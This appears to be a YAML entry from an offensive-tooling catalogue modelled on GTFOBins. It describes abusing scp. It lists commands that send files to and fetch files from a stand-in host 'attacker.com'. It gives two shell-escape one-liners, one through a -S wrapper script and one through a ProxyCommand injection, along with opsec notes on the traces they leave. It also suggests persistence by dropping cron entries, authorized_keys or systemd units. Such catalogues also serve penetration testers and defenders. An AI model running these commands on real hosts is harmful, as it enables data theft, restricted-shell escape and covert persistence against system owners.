---
name: scp
capabilities:
- exec
- spawn
- upload
- download
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: scp user@attacker.com:/path/to/input-file /path/to/output-file
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
    chmod +x /path/to/temp-file
    scp -S /path/to/temp-file x x:
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: 'scp -o ''ProxyCommand=;/bin/sh 0<&2 1>&2'' x x:'
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: scp /path/to/input-file user@attacker.com:/path/to/output-file
references:
- https://gtfobins.github.io/gtfobins/scp/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
